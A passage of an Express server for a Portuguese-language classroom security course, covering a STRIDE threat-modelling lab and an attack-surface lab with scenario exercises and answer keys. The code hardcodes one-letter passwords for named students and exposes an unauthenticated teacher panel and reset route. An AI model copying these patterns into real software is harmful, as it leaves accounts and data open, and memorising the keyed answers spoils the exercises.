        border: 1px solid #e2e8f0; background: #f8fafc;
        user-select: none; transition: background 0.15s;
    }
    .stride-cat-header:hover { background: #eef2ff; }
    .stride-cat-header.open { background: #eef2ff; border-color: #c7d2fe; border-radius: 6px 6px 0 0; }
    .stride-letter {
        width: 24px; height: 24px; border-radius: 5px; flex-shrink: 0;
        display: flex; align-items: center; justify-content: center;
        font-weight: 700; font-size: 12px; color: white;
    }
    .stride-cat-name { font-size: 12px; font-weight: 600; color: #374151; flex: 1; }
    .stride-cat-arrow { font-size: 10px; color: #94A3B8; transition: transform 0.2s; }
    .stride-cat-body {
        display: none; padding: 10px; background: #f0f4ff;
        border: 1px solid #c7d2fe; border-top: none;
        border-radius: 0 0 6px 6px; font-size: 11px; color: #374151; line-height: 1.65;
    }
    .stride-cat-body.open { display: block; }
    .sidebar-actions { margin-top: auto; padding-top: 14px; border-top: 1px solid #E2E8F0; }
    .btn-reset { display:block; width:100%; text-align:center; padding:9px; background:#6c757d; color:white; border:none; border-radius:5px; cursor:pointer; font-size:12px; font-weight:600; margin-bottom:6px; }
    .btn-logout { display:block; text-align:center; padding:9px; background:#374151; color:white; text-decoration:none; border-radius:5px; font-size:12px; margin-bottom:6px; }
    .btn-hub { display:block; text-align:center; padding:8px; color:#6B7280; text-decoration:none; font-size:12px; }
    .main { flex:1; padding:22px 28px; max-width: 780px; }
    .main-header {
        background: linear-gradient(135deg, #4338CA, #3730A3); color: white;
        padding: 16px 20px; border-radius: 10px; margin-bottom: 20px;
    }
    .main-header h2 { font-size: 17px; margin-bottom: 4px; }
    .main-header p { font-size: 12px; opacity: 0.85; }
    .exercise-card {
        background: white; border-radius: 10px; padding: 18px 20px;
        margin-bottom: 16px; border: 2px solid #E2E8F0;
        transition: border-color 0.2s, box-shadow 0.2s;
    }
    .exercise-card.concluido { border-color: #22C55E; box-shadow: 0 0 0 3px rgba(34,197,94,0.08); }
    .card-meta { display:flex; gap:8px; align-items:center; margin-bottom:12px; flex-wrap:wrap; }
    .badge-sistema { font-size: 11px; font-weight: 600; padding: 3px 9px; border-radius: 999px; }
    .badge-banco { background: #EEF2FF; color: #4338CA; }
    .badge-saude { background: #F0FDF4; color: #15803D; }
    .badge-num { font-size: 11px; color: #94A3B8; margin-left: auto; }
    .badge-check { font-size: 16px; }
    .cenario-box {
        font-size: 12.5px; color: #374151; line-height: 1.75; margin-bottom: 14px;
        background: #F8FAFC; border-radius: 6px; padding: 12px 14px;
        border-left: 3px solid #CBD5E1;
    }
    .pergunta-box { border: 1px solid #C7D2FE; border-radius: 7px; padding: 14px; }
    .pergunta-text { font-size: 13px; font-weight: 600; color: #1e1b4b; margin-bottom: 6px; }
    .dica-text { font-size: 11px; color: #6B7280; margin-bottom: 10px; font-style: italic; line-height: 1.5; }
    .resp-input {
        width: 100%; padding: 9px; border: 1px solid #CBD5E1; border-radius: 5px;
        font-size: 13px; margin-bottom: 8px;
    }
    .resp-input:focus { outline: none; border-color: #818CF8; box-shadow: 0 0 0 2px rgba(129,140,248,0.2); }
    .validar-btn {
        padding: 9px 20px; background: #4338CA; color: white; border: none;
        border-radius: 5px; font-weight: 700; cursor: pointer; font-size: 13px;
        transition: background 0.15s;
    }
    .validar-btn:hover { background: #3730A3; }
    .feedback-text { margin-top: 8px; font-size: 12px; min-height: 18px; }
    pre { white-space: pre-wrap; word-break: break-word; }
    code { background: #F1F5F9; padding: 1px 5px; border-radius: 3px; font-size: 11.5px; }
`;

const scriptStride = `
    function toggleConceito(letra) {
        const body   = document.getElementById('conceito-' + letra);
        const arrow  = document.getElementById('arrow-'   + letra);
        const header = body.previousElementSibling;
        const isOpen = body.classList.contains('open');
        document.querySelectorAll('.stride-cat-body').forEach(b => b.classList.remove('open'));
        document.querySelectorAll('.stride-cat-header').forEach(h => h.classList.remove('open'));
        document.querySelectorAll('.stride-cat-arrow').forEach(a => a.textContent = '▶');
        if (!isOpen) {
            body.classList.add('open');
            header.classList.add('open');
            arrow.textContent = '▼';
        }
    }

    async function validarStride(id) {
        const input = document.getElementById('resp-' + id);
        const fb    = document.getElementById('fb-'   + id);
        try {
            const r   = await fetch('/stride/lab/validar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ testeId: id, resposta: input.value })
            });
            const res = await r.json();
            if (res.correto) {
                fb.textContent = '✅ Correto! Exercício concluído.';
                fb.style.color = '#16a34a';
                document.getElementById('card-'  + id).classList.add('concluido');
                document.getElementById('check-' + id).textContent = '✅';
                atualizarContadorUI();
            } else {
                fb.textContent = '❌ Ainda não. Consulte a barra lateral e tente novamente.';
                fb.style.color = '#dc2626';
            }
        } catch (err) {
            fb.textContent = '❌ Erro: ' + err.message;
            fb.style.color = '#dc2626';
        }
    }

    async function atualizarContadorUI() {
        try {
            const r   = await fetch('/stride/lab/progresso');
            const res = await r.json();
            document.getElementById('contador-progresso').textContent = (res.concluidos || []).length + ' / 10 concluídos';
        } catch (e) {}
    }

    async function carregarProgressoStride() {
        try {
            const r   = await fetch('/stride/lab/progresso');
            const res = await r.json();
            (res.concluidos || []).forEach(id => {
                const card  = document.getElementById('card-'  + id);
                const check = document.getElementById('check-' + id);
                if (card)  card.classList.add('concluido');
                if (check) check.textContent = '✅';
            });
            document.getElementById('contador-progresso').textContent = (res.concluidos || []).length + ' / 10 concluídos';
        } catch (err) { console.error('Erro ao carregar progresso:', err); }
    }

    async function resetarStride() {
        if (!confirm('⚠️ Isso vai zerar todo o seu progresso. Continuar?')) return;
        try {
            const r   = await fetch('/stride/lab/reset', { method: 'POST' });
            const res = await r.json();
            alert(res.mensagem || res.erro);
            window.location.reload();
        } catch (err) { alert('❌ Erro: ' + err.message); }
    }

    carregarProgressoStride();
`;

// 9 alunos com login individual — usuário = primeiro nome em minúsculas, senha = letra maiúscula
const ALUNOS_STRIDE = [
    { usuario: 'antonio',  senha: 'M', nomeExibicao: 'Antonio M' },
    { usuario: 'laura',    senha: 'M', nomeExibicao: 'Laura M' },
    { usuario: 'max',      senha: 'C', nomeExibicao: 'Max C' },
    { usuario: 'sergio',   senha: 'B', nomeExibicao: 'Sérgio B' },
    { usuario: 'aline',    senha: 'B', nomeExibicao: 'Aline B' },
    { usuario: 'enzo',     senha: 'V', nomeExibicao: 'Enzo V' },
    { usuario: 'fernanda', senha: 'A', nomeExibicao: 'Fernanda A' },
    { usuario: 'maiara',   senha: 'M', nomeExibicao: 'Maiara M' },
    { usuario: 'paulo',    senha: 'B', nomeExibicao: 'Paulo B' }
];
const CREDENCIAIS_STRIDE = {};
ALUNOS_STRIDE.forEach(a => { CREDENCIAIS_STRIDE[a.usuario] = a; });

app.get('/stride', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'stride-login.html'));
});

app.post('/stride/login', (req, res) => {
    const usuario = String(req.body.usuario || '').trim().toLowerCase();
    const senha   = String(req.body.senha   || '').trim();
    const conta   = CREDENCIAIS_STRIDE[usuario];
    if (!conta || conta.senha !== senha) return res.redirect('/stride?erro=1');
    req.session.strideAluno = usuario;
    req.session.strideNome  = conta.nomeExibicao;
    res.redirect('/stride/lab');
});

app.get('/stride/logout', (req, res) => {
    req.session.strideAluno = null;
    req.session.strideNome  = null;
    res.redirect('/stride');
});

function exigirLoginStride(req, res, next) {
    if (req.session.strideAluno) return next();
    res.redirect('/stride');
}

// Painel do professor — antes de /stride/lab para não ser capturado por rotas mais específicas
app.get('/stride/painel-professor/dados', async (req, res) => {
    try {
        const r = await pool.query('SELECT aluno, teste_id, concluido_em FROM stride_progresso');
        const concluidos = {};
        r.rows.forEach(row => { concluidos[row.aluno + ':' + row.teste_id] = row.concluido_em; });
        res.json({ concluidos });
    } catch (err) { res.status(500).json({ erro: err.message }); }
});

app.get('/stride/painel-professor', async (req, res) => {
    try {
        const r = await pool.query('SELECT aluno, teste_id, concluido_em FROM stride_progresso');
        const concluidos = {};
        r.rows.forEach(row => { concluidos[row.aluno + ':' + row.teste_id] = row.concluido_em; });

        // Cabeçalho com nome dos alunos
        const headerCols = ALUNOS_STRIDE.map(a =>
            `<th style="padding:8px 6px;border:1px solid #3730A3;font-size:11px;min-width:70px;">${a.nomeExibicao}</th>`
        ).join('');

        // Linha por exercício, coluna por aluno
        const linhas = testesStride.map(t => {
            const colunas = ALUNOS_STRIDE.map(a => {
                const key = a.usuario + ':' + t.id;
                const ts  = concluidos[key];
                const id  = 'cel-' + a.usuario + '-' + t.id;
                if (ts) {
                    const dt = new Date(ts).toLocaleString('pt-BR');
                    return `<td id="${id}" style="padding:7px 5px;border:1px solid #ddd;text-align:center;background:#d4edda;font-size:11px;">✅<br><small style="color:#555;">${dt}</small></td>`;
                }
                return `<td id="${id}" style="padding:7px 5px;border:1px solid #ddd;text-align:center;background:#f8d7da;color:#721c24;font-size:13px;">❌</td>`;
            }).join('');

            const totalExercicio = ALUNOS_STRIDE.filter(a => concluidos[a.usuario + ':' + t.id]).length;
            return `<tr>
                <td style="padding:8px 10px;border:1px solid #ddd;font-size:12px;white-space:nowrap;">${t.nome}</td>
                ${colunas}
                <td style="padding:7px 8px;border:1px solid #ddd;text-align:center;font-size:12px;font-weight:bold;background:#f8f9ff;">${totalExercicio}/${ALUNOS_STRIDE.length}</td>
            </tr>`;
        }).join('');

        // Linha de totais por aluno
        const totaisColunas = ALUNOS_STRIDE.map(a => {
            const total = testesStride.filter(t => concluidos[a.usuario + ':' + t.id]).length;
            return `<td id="total-${a.usuario}" style="padding:8px 5px;border:1px solid #4338CA;text-align:center;font-weight:bold;background:#eef2ff;font-size:13px;">${total}/10</td>`;
        }).join('');

        res.send(`<!DOCTYPE html><html><head>
            <meta charset="UTF-8">
            <title>Painel do Professor — STRIDE</title>
            <style>
                body { font-family:sans-serif; max-width:1100px; margin:40px auto; padding:20px; }
                table { border-collapse: collapse; }
                th { background:#4338CA; color:white; }
                .table-wrap { overflow-x: auto; }
            </style>
        </head><body>
            <h2>🧑‍🏫 Painel do Professor — STRIDE: Modelagem de Ameaças</h2>
            <p style="color:#666;margin-bottom:20px;">Esta página não tem link nos menus.
                <span id="status-auto" style="color:#4338CA;">🟢 Atualizando automaticamente...</span></p>

            <div class="table-wrap">
            <table style="width:100%;min-width:900px;">
                <thead>
                    <tr>
                        <th style="padding:10px;border:1px solid #3730A3;text-align:left;min-width:180px;">Exercício</th>
                        ${headerCols}
                        <th style="padding:8px;border:1px solid #3730A3;font-size:11px;">Total</th>
                    </tr>
                </thead>
                <tbody>${linhas}</tbody>
                <tfoot>
                    <tr>
                        <td style="padding:8px 10px;border:1px solid #4338CA;font-weight:bold;background:#eef2ff;">Total por aluno</td>
                        ${totaisColunas}
                        <td style="border:1px solid #4338CA;background:#eef2ff;"></td>
                    </tr>
                </tfoot>
            </table>
            </div>

            <div style="margin-top:20px;display:flex;flex-wrap:wrap;gap:10px;">
                ${ALUNOS_STRIDE.map(a => `
                    <form action="/stride/painel-professor/limpar/${a.usuario}" method="POST"
                          onsubmit="return confirm('Limpar progresso de ${a.nomeExibicao}?');">
                        <button type="submit" style="padding:8px 14px;background:#6c757d;color:white;border:none;border-radius:4px;cursor:pointer;font-size:12px;">
                            🧹 ${a.nomeExibicao}
                        </button>
                    </form>
                `).join('')}
            </div>

            <script>
                const ALUNOS_IDS  = ${JSON.stringify(ALUNOS_STRIDE.map(a => a.usuario))};
                const TESTES_IDS  = ${JSON.stringify(testesStride.map(t => t.id))};

                async function atualizarPainelStride() {
                    try {
                        const res     = await fetch('/stride/painel-professor/dados');
                        const dados   = await res.json();
                        const concluidos = dados.concluidos || {};

                        // Atualiza células individualmente
                        ALUNOS_IDS.forEach(aluno => {
                            let total = 0;
                            TESTES_IDS.forEach(testeId => {
                                const cel = document.getElementById('cel-' + aluno + '-' + testeId);
                                if (!cel) return;
                                const ts = concluidos[aluno + ':' + testeId];
                                if (ts) {
                                    total++;
                                    if (cel.dataset.ts !== ts) {
                                        cel.style.background = '#d4edda';
                                        cel.style.color = '';
                                        cel.innerHTML = '✅<br><small style="color:#555;">' + new Date(ts).toLocaleString('pt-BR') + '</small>';
                                        cel.dataset.ts = ts;
                                    }
                                } else if (cel.dataset.ts) {
                                    cel.style.background = '#f8d7da';
                                    cel.style.color = '#721c24';
                                    cel.innerHTML = '❌';
                                    delete cel.dataset.ts;
                                }
                            });
                            const totEl = document.getElementById('total-' + aluno);
                            if (totEl) totEl.textContent = total + '/10';
                        });

                        document.getElementById('status-auto').textContent = '🟢 Atualizando automaticamente...';
                    } catch(err) {
                        document.getElementById('status-auto').textContent = '🔴 Falha: ' + err.message;
                    }
                }

                setInterval(atualizarPainelStride, 5000);
            </script>
        </body></html>`);
    } catch (err) {
        res.status(500).send(`<p style="color:red;font-family:sans-serif;">❌ Erro: ${escapeHtml(err.message)}</p>`);
    }
});

app.post('/stride/painel-professor/limpar/:aluno', async (req, res) => {
    const aluno = req.params.aluno;
    const conta = CREDENCIAIS_STRIDE[aluno];
    if (!conta) return res.status(400).send('Aluno desconhecido');
    try {
        await pool.query('DELETE FROM stride_progresso WHERE aluno=$1', [aluno]);
        res.redirect('/stride/painel-professor');
    } catch (err) {
        res.status(500).send(`<p style="color:red;font-family:sans-serif;">❌ Erro: ${escapeHtml(err.message)}</p>`);
    }
});

// Dashboard individual do aluno
app.get('/stride/lab', exigirLoginStride, (req, res) => {
    const aluno = req.session.strideAluno;
    const nome  = req.session.strideNome;
    res.send(`<!DOCTYPE html><html><head>
        <meta charset="UTF-8">
        <title>STRIDE — ${escapeHtml(nome)}</title>
        <style>${estiloStride}</style>
    </head><body>
    <div class="container">
        <div class="sidebar">
            <div class="sidebar-brand">
                <h2>🗺️ STRIDE</h2>
                <p>Olá, <strong>${escapeHtml(nome)}</strong></p>
            </div>
            <div class="contador-box">
                <p id="contador-progresso">0 / 10 concluídos</p>
            </div>
            <div class="stride-section-title">Referência STRIDE</div>
            <p class="stride-hint">Clique em uma categoria para ler o conceito antes de responder.</p>
            ${renderSidebarConceitos()}
            <div class="sidebar-actions">
                <button class="btn-reset" onclick="resetarStride()">🔄 Resetar Progresso</button>
                <a href="/stride/logout" class="btn-logout">🚪 Sair</a>
                <a href="/" class="btn-hub">← Voltar ao Hub</a>
            </div>
        </div>
        <div class="main">
            <div class="main-header">
                <h2>🗺️ Threat Modeling — STRIDE</h2>
                <p>Analise cada cenário, consulte os conceitos na barra lateral e identifique a ameaça STRIDE correspondente.</p>
            </div>
            ${renderExerciciosStride(aluno)}
        </div>
    </div>
    <script>${scriptStride}</script>
    </body></html>`);
});

app.get('/stride/lab/progresso', exigirLoginStride, async (req, res) => {
    const aluno = req.session.strideAluno;
    try {
        const r = await pool.query('SELECT teste_id FROM stride_progresso WHERE aluno=$1', [aluno]);
        res.json({ concluidos: r.rows.map(row => row.teste_id) });
    } catch (err) { res.status(500).json({ erro: err.message }); }
});

app.post('/stride/lab/validar', exigirLoginStride, async (req, res) => {
    const aluno = req.session.strideAluno;
    const { testeId, resposta } = req.body;
    const respostas = RESPOSTAS_STRIDE[testeId];
    if (!respostas) return res.status(400).json({ correto: false, erro: 'Exercício desconhecido' });

    const normalizada = normalizarRespostaStride(resposta);
    const correto = Array.isArray(respostas)
        ? respostas.some(r => normalizarRespostaStride(r) === normalizada)
        : normalizarRespostaStride(respostas) === normalizada;

    if (correto) {
        try {
            await pool.query(
                'INSERT INTO stride_progresso (aluno, teste_id) VALUES ($1,$2) ON CONFLICT (aluno, teste_id) DO UPDATE SET concluido_em = NOW()',
                [aluno, testeId]
            );
        } catch (err) { console.error('Erro ao registrar progresso STRIDE:', err.message); }
    }
    res.json({ correto });
});

app.post('/stride/lab/reset', exigirLoginStride, async (req, res) => {
    const aluno = req.session.strideAluno;
    try {
        await pool.query('DELETE FROM stride_progresso WHERE aluno=$1', [aluno]);
        res.json({ sucesso: true, mensagem: `✅ Progresso de ${aluno} no Lab STRIDE resetado com sucesso!` });
    } catch (err) { res.status(500).json({ sucesso: false, erro: err.message }); }
});

// =====================================
// LAB 6: SUPERFÍCIE DE ATAQUE
// Aula 17 — Mapear ameaças e riscos em aplicações e APIs
// Login individual (mesmos 9 alunos do STRIDE, mesmas senhas)
// =====================================

const SUPERFICIE_CONCEITOS = [
    { icone: '🎯', nome: 'Superfície de Ataque', cor: '#DC2626',
      descricao: 'Conjunto de todos os pontos de uma aplicação que podem ser acessados e explorados por um atacante. Cada formulário, API ou endpoint exposto é um ponto na superfície.',
      exemplo: 'Formulário de login, endpoint POST /api/upload e URL com parâmetros são pontos na superfície de ataque.' },
    { icone: '🚪', nome: 'Ponto de Entrada', cor: '#EA580C',
      descricao: 'Qualquer lugar onde dados externos chegam ao sistema: campos de formulário, parâmetros de URL, cabeçalhos HTTP, arquivos enviados, cookies manipuláveis.',
      exemplo: 'Regra prática: se um usuário (ou atacante) pode enviar algo para ali, é um ponto de entrada.' },
    { icone: '➡️', nome: 'Vetor de Ataque', cor: '#B45309',
      descricao: 'O caminho específico que um atacante usa para explorar um ponto de entrada. A superfície é o conjunto de TODOS os pontos; o vetor é a ROTA escolhida pelo atacante.',
      exemplo: 'Analogia: a superfície é o mapa completo; o vetor é o caminho traçado para chegar ao alvo.' },
    { icone: '🌐', nome: 'Superfície Interna vs Externa', cor: '#7C3AED',
      descricao: 'Externa: acessível pela internet (login, APIs públicas). Interna: acessível apenas dentro da rede (banco de dados, backend). Atacantes externos só alcançam a superfície externa.',
      exemplo: 'Atenção: banco de dados exposto na internet vira superfície EXTERNA — isso é uma vulnerabilidade crítica.' },
    { icone: '✂️', nome: 'Redução de Superfície', cor: '#059669',
      descricao: 'Princípio: quanto menor a superfície, menor o risco. Remova endpoints não usados, desative funcionalidades desnecessárias, limite quem pode acessar o quê.',
      exemplo: 'Remover é mais seguro que mitigar: um endpoint desativado não pode ser explorado, independente do quão vulnerável seria.' }
];

const ITEMS_DRAG_SUP7 = [
    { id: 'a', texto: 'Formulário de login da aplicação', correto: 'sim' },
    { id: 'b', texto: 'Endpoint de API sem autenticação (GET /api/dados)', correto: 'sim' },
    { id: 'c', texto: 'Campo de busca com parâmetro de URL (?busca=termo)', correto: 'sim' },
    { id: 'd', texto: 'Código-fonte que valida senhas (roda internamente no servidor)', correto: 'nao' },
    { id: 'e', texto: 'Arquivo .env com variáveis de ambiente do servidor', correto: 'nao' },
    { id: 'f', texto: 'Chave privada SSL armazenada internamente no servidor', correto: 'nao' }
];

const ITEMS_DRAG_SUP8 = [
    { id: 'a', texto: 'Página de login (/login)', correto: 'sim' },
    { id: 'b', texto: 'Endpoint de upload de arquivos (POST /upload)', correto: 'sim' },
    { id: 'c', texto: 'API pública sem token (GET /api/clientes)', correto: 'sim' },
    { id: 'd', texto: 'Painel administrativo sem autenticação (/admin)', correto: 'sim' },
    { id: 'e', texto: 'Parâmetro de URL manipulável: /relatorio?id=42', correto: 'sim' },
    { id: 'f', texto: 'Endpoint de redefinição de senha (/esqueci-senha)', correto: 'sim' },
    { id: 'g', texto: 'Função interna de cálculo de juros (lógica do servidor)', correto: 'nao' },
    { id: 'h', texto: 'Banco de dados PostgreSQL na rede interna (porta fechada)', correto: 'nao' },
    { id: 'i', texto: 'Chave privada RSA armazenada no servidor', correto: 'nao' },
    { id: 'j', texto: 'Lógica de aprovação de crédito (regra de negócio interna)', correto: 'nao' },
    { id: 'k', texto: 'Variáveis de ambiente (.env) do servidor', correto: 'nao' },
    { id: 'l', texto: 'Documentação interna não publicada na internet', correto: 'nao' }
];

// Dados para os exercícios 11-15 (interativos)
const ITEMS_MAP_SUP11 = [
    { id: 'lb',   emoji: '⚖️', nome: 'Load Balancer',                zona: 'ext', correto: true  },
    { id: 'app',  emoji: '🖥️', nome: 'App Server (Node.js)',         zona: 'ext', correto: true  },
    { id: 'api',  emoji: '🔗', nome: 'API Pagamentos (parceiro)',     zona: 'ext', correto: false },
    { id: 'db',   emoji: '🗄️', nome: 'Banco de Dados PostgreSQL',    zona: 'int', correto: false },
    { id: 'log',  emoji: '📊', nome: 'Servidor de Logs',             zona: 'int', correto: false },
    { id: 'cache',emoji: '⚡', nome: 'Cache Redis',                  zona: 'int', correto: false },
    { id: 'nfs',  emoji: '📁', nome: 'Servidor de Arquivos (NFS)',    zona: 'int', correto: false },
];

const PASSOS_SUP12 = [
    { id: 'a', texto: '📋 Levantar os componentes do sistema (inventário completo)' },
    { id: 'b', texto: '🚪 Identificar pontos de entrada — formulários, APIs, parâmetros de URL' },
    { id: 'c', texto: '🔐 Verificar quais pontos requerem autenticação' },
    { id: 'd', texto: '⚠️ Classificar cada ponto por nível de risco' },
    { id: 'e', texto: '📄 Documentar a superfície mapeada no relatório' },
];
const ORDEM_CORRETA_SUP12 = ['a', 'b', 'c', 'd', 'e'];

const STORIES_SUP13 = [
    { id: 'a', tag: 'US-14', texto: 'Como usuário, quero fazer upload de comprovante de pagamento.', correto: true  },
    { id: 'b', tag: 'US-15', texto: 'Como desenvolvedor, quero refatorar a função de cálculo de desconto (lógica interna).', correto: false },
    { id: 'c', tag: 'US-16', texto: 'Como admin, quero ter um painel para visualizar logs de acesso de usuários.', correto: true  },
    { id: 'd', tag: 'US-17', texto: 'Como usuário, quero receber notificações por e-mail ao finalizar uma compra.', correto: false },
    { id: 'e', tag: 'US-18', texto: 'Como sistema, quero integrar com a API do Google Calendar para sincronizar agenda.', correto: true  },
    { id: 'f', tag: 'US-19', texto: 'Como time, quero migrar o banco de dados para um servidor interno com mais memória.', correto: false },
];

const HOTSPOTS_SUP14 = [
    { id: 'search',  correto: true  },
    { id: 'login',   correto: true  },
    { id: 'admin',   correto: true  },
    { id: 'filter',  correto: true  },
    { id: 'form',    correto: true  },
    { id: 'logo',    correto: false },
    { id: 'listing', correto: false },
    { id: 'copy',    correto: false },
];

const BLANKS_SUP15 = [
    { id: 'b1', opcoes: ['3', '5', '8'],           correto: '5'                                        },
    { id: 'b2', opcoes: ['1', '2', '3'],            correto: '2'                                        },
    { id: 'b3', opcoes: ['upload de comprovantes', 'painel admin', 'API de transferência'], correto: 'painel admin' },
    { id: 'b4', opcoes: ['adicionar MFA na API', 'desativar o painel admin', 'aumentar o timeout'], correto: 'desativar o painel admin' },
];

const CONTEUDO_SUPERFICIE = {
    sup1: {
        fase: 'observacao', faseLbl: 'Observação', nivel: '🟢',
        titulo: 'Exercício 1 — Pontos de Entrada em um Formulário',
        cenario: `<p>Observe o formulário de login abaixo. Em segurança, cada campo que aceita entrada de dados externos é um <strong>ponto de entrada</strong> — e pontos de entrada compõem a superfície de ataque.</p>
<div style="background:#fff;border:2px solid #e2e8f0;border-radius:8px;padding:16px;margin:12px 0;max-width:300px;">
    <div style="margin-bottom:10px;"><span style="font-size:12px;font-weight:600;color:#374151;">Usuário:</span><br>
    <div style="border:1px solid #CBD5E1;border-radius:4px;padding:8px 10px;background:#f8fafc;font-size:12px;color:#94A3B8;margin-top:4px;">Digite seu usuário</div></div>
    <div style="margin-bottom:12px;"><span style="font-size:12px;font-weight:600;color:#374151;">Senha:</span><br>
    <div style="border:1px solid #CBD5E1;border-radius:4px;padding:8px 10px;background:#f8fafc;font-size:12px;color:#94A3B8;margin-top:4px;">••••••••</div></div>
    <div style="background:#DC2626;color:white;text-align:center;padding:8px;border-radius:4px;font-size:12px;font-weight:600;">Entrar</div>
</div>`,
        pergunta: 'Quantos <strong>pontos de entrada de dados</strong> um atacante encontra neste formulário?',
        dica: 'Conte apenas os campos onde o usuário pode DIGITAR algo. O botão "Entrar" executa uma ação mas não aceita dados digitados.'
    },
    sup2: {
        fase: 'observacao', faseLbl: 'Observação', nivel: '🟢',
        titulo: 'Exercício 2 — Parâmetros de URL',
        cenario: `<p>O BancoPix gera a URL abaixo quando um cliente acessa seu extrato:</p>
<div style="background:#1e1b4b;color:#a5b4fc;padding:14px;border-radius:6px;font-family:monospace;font-size:12px;word-break:break-all;margin:12px 0;line-height:1.8;">
https://app.bancoPix.com/extrato?<span style="color:#fbbf24;">conta</span>=33412&amp;<span style="color:#fbbf24;">formato</span>=pdf&amp;<span style="color:#fbbf24;">periodo</span>=2024-01
</div>
<p>Tudo após o <code>?</code> são <strong>parâmetros de URL</strong>. Cada parâmetro que aceita entrada direta é um ponto na superfície de ataque — um atacante poderia modificar <code>conta</code> para ver extratos alheios, alterar <code>formato</code> para tentar exploits, ou manipular <code>periodo</code> para acessar dados além do autorizado.</p>`,
        pergunta: 'Quantos <strong>parâmetros</strong> desta URL aceitam entrada direta do usuário (e poderiam ser manipulados por um atacante)?',
        dica: 'Cada par chave=valor separado por "&" é um parâmetro distinto. Conte todos os parâmetros presentes na URL.'
    },
    sup3: {
        fase: 'observacao', faseLbl: 'Observação', nivel: '🟢',
        titulo: 'Exercício 3 — Nomeando o Conceito',
        cenario: `<p>O endpoint abaixo foi encontrado durante análise do BancoPix:</p>
<div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:6px;padding:14px;margin:12px 0;">
    <code style="color:#DC2626;font-size:13px;">GET /api/clientes</code><br><br>
    <div style="font-size:12px;color:#374151;line-height:1.8;">
        → Retorna lista completa de clientes com nome, CPF e saldo<br>
        → <strong>Não exige token de autenticação</strong><br>
        → Qualquer pessoa com acesso à internet pode chamar este endpoint
    </div>
</div>
<p style="font-size:12px;">Este é apenas <em>um</em> dos muitos pontos expostos na aplicação. O formulário de login, a API de transferências, o endpoint de upload — cada um é mais um ponto exposto. Em segurança, damos um nome específico ao <strong>conjunto de todos</strong> esses pontos.</p>`,
        pergunta: 'Como chamamos o <strong>conjunto de todos os pontos</strong> expostos de uma aplicação que podem ser explorados por um atacante?',
        dica: 'É o conceito central desta aula — duas palavras. Consulte a barra lateral.'
    },
    sup4: {
        fase: 'diferenciacao', faseLbl: 'Diferenciação', nivel: '🟡',
        titulo: 'Exercício 4 — O Que NÃO É Superfície de Ataque',
        cenario: `<p>O BancoPix tem uma função chamada <code>calcularJuros()</code>:</p>
<div style="background:#0f172a;color:#94a3b8;padding:14px;border-radius:6px;font-family:monospace;font-size:11.5px;margin:12px 0;line-height:1.8;">
<span style="color:#64748b;">// Roda EXCLUSIVAMENTE no servidor</span><br>
<span style="color:#64748b;">// Nunca recebe dados externos diretamente</span><br>
<span style="color:#64748b;">// Só é acionada internamente após aprovação de crédito</span><br><br>
<span style="color:#7dd3fc;">function</span> <span style="color:#fbbf24;">calcularJuros</span>(<span style="color:#a5b4fc;">valor, taxa, dias</span>) {<br>
&nbsp;&nbsp;<span style="color:#7dd3fc;">return</span> valor * Math.pow(<span style="color:#fb923c;">1</span> + taxa, dias / <span style="color:#fb923c;">365</span>);<br>
}
</div>
<p style="font-size:12px;">Esta função não tem rota HTTP, não tem formulário associado, e um atacante externo <strong>não tem como chamá-la diretamente</strong> — ela só executa quando partes internas do sistema a acionam.</p>`,
        pergunta: 'Esta função interna <code>calcularJuros()</code> faz parte da <strong>superfície de ataque</strong>? Responda <strong>sim</strong> ou <strong>não</strong>.',
        dica: 'Consulte "Superfície Interna vs Externa" na barra lateral. Um atacante externo consegue enviar dados diretamente para esta função?'
    },
    sup5: {
        fase: 'diferenciacao', faseLbl: 'Diferenciação', nivel: '🟡',
        titulo: 'Exercício 5 — Ponto de Entrada em Upload',
        cenario: `<p>O MedConsulta permite upload de laudos médicos:</p>
<div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:6px;padding:14px;margin:12px 0;">
    <code style="color:#DC2626;font-size:13px;">POST /laudos/upload</code><br><br>
    <div style="font-size:12px;color:#374151;line-height:1.8;">
        → Aceita qualquer tipo de arquivo (sem verificar extensão ou conteúdo)<br>
        → Qualquer usuário autenticado pode enviar<br>
        → Arquivo salvo diretamente no servidor de produção
    </div>
</div>
<p style="font-size:12px;">Um atacante poderia enviar um arquivo <code>.php</code>, <code>.exe</code> ou um PDF com código malicioso embutido. O endpoint aceita dados externos — um atacante pode explorar a falta de validação do tipo de arquivo.</p>`,
        pergunta: 'Este endpoint <code>POST /laudos/upload</code> faz parte da <strong>superfície de ataque</strong>? Responda <strong>sim</strong> ou <strong>não</strong>.',
        dica: 'Este endpoint aceita dados externos? Um atacante poderia enviar algo malicioso para este ponto?'
    },
    sup6: {
        fase: 'diferenciacao', faseLbl: 'Diferenciação', nivel: '🟡',
        titulo: 'Exercício 6 — Contexto Importa',
        cenario: `<p>O banco de dados PostgreSQL do BancoPix roda na porta <code>5432</code>. Em uma configuração correta, estaria acessível apenas pela rede interna. Mas o time de infraestrutura cometeu um erro:</p>
<div style="background:#fef2f2;border:2px solid #fecaca;border-radius:6px;padding:14px;margin:12px 0;font-size:12px;">
    <strong style="color:#DC2626;">⚠️ Configuração atual (incorreta):</strong><br><br>
    Porta 5432 do banco → <strong>aberta para a internet</strong><br>
    Qualquer IP externo consegue tentar conexão direta com o banco<br><br>
    <span style="color:#6B7280;">Situação correta: porta acessível apenas pela rede interna da empresa</span>
</div>
<p style="font-size:12px;">Com essa misconfiguration, um atacante pode tentar se conectar ao banco diretamente — sem precisar passar pela aplicação web.</p>`,
        pergunta: 'Neste cenário específico, o banco de dados PostgreSQL faz parte da <strong>superfície de ataque</strong>? Responda <strong>sim</strong> ou <strong>não</strong>.',
        dica: 'A resposta depende do contexto: neste cenário, o banco está na rede interna (fechado) ou exposto para a internet?'
    },
    sup7: {
        fase: 'classificacao', faseLbl: 'Classificação', nivel: '🟡',
        titulo: 'Exercício 7 — Classificar: É ou Não É? (6 itens)',
        cenario: '<p>Abaixo estão 6 componentes de um sistema. Arraste cada cartão para a coluna correta.</p>',
        pergunta: 'Classifique cada componente: <strong>É Superfície de Ataque</strong> ou <strong>Não É Superfície de Ataque</strong>.',
        dica: 'Pense: um atacante externo consegue interagir diretamente com este componente?'
    },
    sup8: {
        fase: 'classificacao', faseLbl: 'Classificação', nivel: '🔴',
